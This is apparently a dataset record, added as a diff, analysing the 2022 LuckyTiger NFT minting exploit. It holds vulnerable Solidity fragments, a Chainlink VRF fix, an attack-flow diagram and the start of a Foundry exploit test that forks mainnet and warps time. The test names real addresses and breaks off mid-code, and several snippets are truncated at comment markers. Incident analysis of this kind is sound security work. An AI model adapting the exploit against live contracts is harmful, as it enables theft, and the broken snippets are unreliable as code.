@@ -1,0 +1,34 @@
+{
+ "id": "2022__2022-08-24_LuckyTiger_WeakRandomness",
+ "source_file": "2022/2022-08-24_LuckyTiger_WeakRandomness.md",
+ "title": "LuckyTiger (NFT) — Predictable Randomness-Based Minting Attack Analysis",
+ "date": "2022-08-24",
+ "protocol": "LuckyTiger NFT",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "NFT fraudulently obtained",
+ "loss_usd": null,
+ "root_cause": "`publicMint()` condition check uses `block.difficulty` and `block.timestamp` as randomness — both are predictable/manipulable",
+ "attack_tx": "0x804f...6af (block 15,403,431)",
+ "vulnerable_contract": null,
+ "classes": [
+  "weak-randomness"
+ ],
+ "code_before": [
+  "❌ Vulnerable publicMint() - uses predictable randomness\nfunction publicMint(uint256 amount) external payable {\n    require(msg.value == amount * 0.01 ether, \"Wrong price\");\n\n    //",
+  "❌ block.difficulty and block.timestamp are predictable/manipulable\n    bytes32 randomHash = keccak256(abi.encodePacked(\n        block.difficulty,   //",
+  "❌ Changed to prevrandao after PoS transition, still limited\n        block.timestamp     //"
+ ],
+ "code_after": [
+  "✅ Correct pattern - use Chainlink VRF\nfunction requestMint(uint256 amount) external payable {\n    require(msg.value == amount * 0.01 ether, \"Wrong price\");\n    // Submit VRF request (asynchronous)\n    uint256 requestId = COORDINATOR.requestRandomWords(\n        keyHash, subscriptionId, 3, 100000, 1\n    );\n    pendingMints[requestId] = MintRequest(msg.sender, amount);\n}\n\nfunction fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {\n    MintRequest memory req = pendingMints[requestId];\n    //",
+  "✅ Condition evaluated using VRF result (cannot be predicted off-chain)\n    if (randomWords[0] % 100 < luckyThreshold) {\n        _mint(req.user, req.amount);\n    }\n}"
+ ],
+ "steps": [
+  "→ Check if uint256(randomHash) % 100 < threshold",
+  "→ Move to a timestamp that satisfies the condition",
+  "Condition satisfied on every call → all succeed"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Fork mainnet at a specific block (15,403,430)\n    │       └─ Fixes block.difficulty and block.timestamp values\n    │\n    ├─[2] Compute hash condition off-chain\n    │       randomHash = keccak256(block.difficulty, block.timestamp)\n    │       → Check if uint256(randomHash) % 100 < threshold\n    │\n    ├─[3] Warp to a favorable timestamp (vm.warp)\n    │       vm.warp(1_661_351_167)\n    │       → Move to a timestamp that satisfies the condition\n    │\n    ├─[4] publicMint{value: 0.01 ether}() × 10 times\n    │       └─ Condition satisfied on every call → all succeed\n    │\n    └─[5] Obtain 10 NFTs (success rate far above normal)",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface INFT {\n    function publicMint(uint256 amount) external payable;\n    function balanceOf(address owner) external view returns (uint256);\n}\n\ncontract LuckyTigerExploit is Test {\n    INFT nft = INFT(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);\n    address attacker = 0x3392c91403f09ad3b7e7243dbd4441436c7f443c;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_403_430);\n        vm.deal(attacker, 1 ether);\n    }\n\n    function testExploit() public {\n        // [Step 1] Warp time to a favorable timestamp\n        vm.warp(1_661_351_167);\n\n        // [Step 2] Verify randomness condition (off-chain prediction)\n        bytes32 randomHash = keccak256(abi.encodePacked(\n         "
+ ]
+}
